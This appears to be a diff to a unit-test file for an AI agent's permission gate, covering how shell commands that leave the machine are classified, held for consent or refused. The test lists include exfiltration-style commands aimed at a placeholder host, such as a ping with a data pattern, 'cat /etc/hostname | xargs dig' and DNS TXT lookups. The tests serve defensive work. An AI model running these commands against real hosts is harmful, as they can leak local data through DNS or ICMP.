@@ -25,6 +25,12 @@ the class it was held for. The consent surfaces name the class in plain words,
 and governance requires the read tier for it, so no false evaluation_blocked
 record is written.
 
+Every git form asks first, wrapped or not (git runs the programs its
+configuration names), so the `git remote` forms are held by their own tier in
+every cell, the direct ask included, and are not this class. A compound is
+refused before any card, with its reason. A refused call that was not the
+person's own ask is told its reason without its command line.
+
 Every case here runs offline: each tool's execute is a recorder, the review is a
 recorder, and the audit log is written to a temporary state directory.
 """
@@ -33,6 +39,7 @@ from __future__ import annotations
 
 import json
 import os
+import re
 import tempfile
 import unittest
 from unittest import mock
@@ -83,8 +90,6 @@ LEAVING = [
     f"dig {HOST}", f"dig +short TXT {HOST}", f"dig @{HOST} example.com",
     f"nslookup example.com {HOST}", f"host {HOST}", f"traceroute {HOST}",
     f"ping -c 1 -p 6c65616b {HOST}", f"lpstat -h {HOST}:631 -p", f"lpq -h {HOST}:631",
-    "git remote update", "git remote show origin",
-    f"git remote set-url origin https://{HOST}/x.git",
 ]
 
 #: The same class reached through the wrappers the classifier sees through, and
@@ -92,22 +97,31 @@ LEAVING = [
 LEAVING_TOO = [
     f"timeout 5 dig {HOST}", f"nice ping -c 1 {HOST}", f"sh -c 'dig {HOST}'",
     f"env dig {HOST}", f"env CUPS_SERVER={HOST} lpstat -p", f"lpstat -hHOST:631 -p",
-    f"git remote -v show origin", f"git remote add x https://{HOST}/x.git",
-    "git remote prune origin", "git remote set-head origin -a",
     f"systemctl is-active --host={HOST} sshd", f"systemctl list-units -H {HOST}",
     f"timedatectl -H {HOST} status", f"hostnamectl --host {HOST} status",
 ]
 
 #: Stays on the machine: AUTO and NOT leaving.
 LOCAL = [
-    "ls", "df -h", "lpstat -p", "lpq", "lpstat -H", "git remote", "git remote -v",
-    "git remote get-url origin", "git status", "systemctl is-active sshd",
+    "ls", "df -h", "lpstat -p", "lpq", "lpstat -H", "systemctl is-active sshd",
     "timedatectl status", "hostnamectl status", "netstat -tn", "ifconfig",
 ]
 
-#: Not this class: a compound keeps its tier, since the shell-free executor
-#: refuses a pipe or a redirect before anything starts, and a CONFIRM form (an
-#: unknown first word such as `systemctl -H`, a download) is held by its own tier.
+#: Every git form asks first (git runs the programs its configuration names):
+#: CONFIRM, held by its own tier in every cell, listed here for the verdict. The
+#: remote forms that leave the machine and the local reads are both here.
+GIT_FORMS = [
+    "git remote update", "git remote show origin",
+    f"git remote set-url origin https://{HOST}/x.git", "git remote -v show origin",
+    f"git remote add x https://{HOST}/x.git", "git remote prune origin",
+    "git remote set-head origin -a", "git remote", "git remote -v",
+    "git remote get-url origin", "git status",
+]
+
+#: Not this class: a compound keeps its tier and is refused before any card,
+#: since the registry refuses a shell construct before the review, and a CONFIRM
+#: form (an unknown first word such as `systemctl -H`, a download) is held by its
+#: own tier.
 NOT_THIS_CLASS = [
     "cat /etc/hostname | xargs dig", f"echo {HOST} | xargs ping -c 1",
     f"curl https://{HOST}/", f"ssh {HOST}", f"systemctl -H {HOST} is-active sshd",
@@ -139,6 +153,12 @@ class TheFormsThatLeaveTheMachineAreNamed(unittest.TestCase):
             with self.subTest(command=command):
                 self.assertFalse(command_leaves_the_machine(command))
 
+    def test_every_git_form_asks_first_and_is_not_this_class(self):
+        for command in GIT_FORMS:
+            with self.subTest(command=command):
+                self.assertEqual(classify_command(command).value, "confirm")
+                self.assertFalse(command_leaves_the_machine(command))
+
 
 class TheRiskTierCarriesTheClass(unittest.TestCase):
 
@@ -155,6 +175,15 @@ class TheRiskTierCarriesTheClass(unittest.TestCase):
             with self.subTest(command=command):
                 self.assertIs(_classify_risk_tier(tool, {"command": command}, "run_command"),
                               ToolRiskTier.READ_ONLY)
+
+    def test_a_git_form_is_held_by_its_own_tier(self):
+        # Neither the read tier nor this class: both run on the direct ask
+        # without a card, and a git form never does.
+        tool = RunCommandTool()
+        for command in GIT_FORMS:
+            with self.subTest(command=command):
+                self.assertNotIn(_classify_risk_tier(tool, {"command": command}, "run_command"),
+                                 (ToolRiskTier.READ_ONLY, EGRESS))
 
     def test_an_external_handler_is_network_egress_and_a_privileged_name_stays(self):
         self.assertIs(_classify_risk_tier(None, {"q": "x"}, "mcp_srv_tool"),
@@ -250,6 +279,11 @@ class TheChokepointHoldsTheModelsNetworkCheck(_AuditedCase):
             with self.subTest(command=command):
                 self.assertEqual(self.cells("run_command", {"command": command}), "EHHHHH")
 
+    def test_every_git_form_is_held_in_every_cell(self):
+        for command in GIT_FORMS:
+            with self.subTest(command=command):
+                self.assertEqual(self.cells("run_command", {"command": command}), "HHHHHH")
+
     def test_the_persons_named_host_with_nothing_read_runs(self):
         self.assertEqual(self.cells("run_command", {"command": "ping -c 1 example.com"})[0], "E")
 
@@ -259,8 +293,9 @@ class TheChokepointHoldsTheModelsNetworkCheck(_AuditedCase):
 
     def test_a_local_read_and_a_refused_compound_are_unchanged(self):
         self.assertEqual(self.cells("run_command", {"command": "ls"}), "EEEEEE")
+        # Refused before any card, with its reason, in every cell.
         self.assertEqual(self.cells("run_command", {"command": "cat /etc/hostname | xargs dig"}),
-                         "EEEEEE")
+                         "RRRRRR")
 
     def test_an_external_tool_runs_on_the_direct_ask_alone_and_is_still_scanned(self):
         self.assertEqual(self.cells("mcp_srv_tool", {"q": "leak-6b2f9d"}), "EHHHHH")
@@ -368,13 +403,24 @@ class TheConsentSurfacesNameTheClass(unittest.TestCase):
         self.assertTrue(decision.allowed)
         self.assertEqual(written, [], "no evaluation_blocked record for a network check")
 
-    def test_the_handoff_for_a_denied_check_hands_over_the_command(self):
+    def test_the_handoff_for_a_denied_check_on_the_models_word_withholds_the_command(self):
         call = ToolCall(name="run_command", arguments={"command": f"dig {HOST}"},
                         source_of_request=Provenance.USER_IMPLIED)
         denied = ToolResult(call_id="c", name="run_command", content="denied",
                             success=False, executed=False, denied_by_user=True)
         message = gate_refusal_message(call, denied, RunCommandTool())
-        self.assertIn(f"`dig {HOST}`", message)
+        self.assertTrue(message.strip())
+        self.assertNotIn(HOST, message)
+        self.assertNotIn("sudo", message)
+
+    def test_the_handoff_for_the_persons_own_denied_check_hands_over_the_command(self):
+        call = ToolCall(name="run_command", arguments={"command": f"dig {HOST}"},
+                        source_of_request=Provenance.USER_DIRECT)
+        denied = ToolResult(call_id="c", name="run_command", content="denied",
+                            success=False, executed=False, denied_by_user=True)
+        message = gate_refusal_message(call, denied, RunCommandTool())
+        # The line as the runner would start it: the program resolved on its path.
+        self.assertRegex(message, rf"`(\S+/)?dig {re.escape(HOST)}`")
         self.assertNotIn("sudo", message)
 
 
@@ -427,8 +473,10 @@ class TheNativeRouteHoldsTheModelsNetworkCheck(screened._Case, _AuditedCase):
         self.assertEqual(len(self.asked), 1)
         self.assertEqual(self.ran, [])
         self.assertTrue(result.tool_results[0].denied_by_user)
-        self.assertIn(f"`dig {HOST}`", gate_refusal_message(
-            result.tool_calls[0], result.tool_results[0], RunCommandTool()))
+        # The model's call is told its reason, never its command line.
+        message = gate_refusal_message(result.tool_calls[0], result.tool_results[0], RunCommandTool())
+        self.assertTrue(message.strip())
+        self.assertNotIn(HOST, message)
 
     def test_a_direct_label_once_a_page_was_read_is_held(self):
         self.route("user_direct", "deny", ingress=True)
@@ -453,6 +501,13 @@ class TheNativeRouteHoldsTheModelsNetworkCheck(screened._Case, _AuditedCase):
                 self.route("user_direct", "deny", command=command)
                 self.assertEqual(self.asked, [])
                 self.assertEqual(self.ran, [("run_command", {"command": command})])
+
+    def test_a_git_form_asks_first_on_the_direct_ask(self):
+        for command in GIT_FORMS:
+            with self.subTest(command=command):
+                self.route("user_direct", "deny", command=command)
+                self.assertEqual([c.arguments["command"] for c in self.asked], [command])
+                self.assertEqual(self.ran, [])
 
     def test_the_network_time_switch_and_the_host_name_ask_even_on_the_direct_ask(self):
         for command in ("timedatectl set-ntp true", "hostnamectl set-hostname x"):
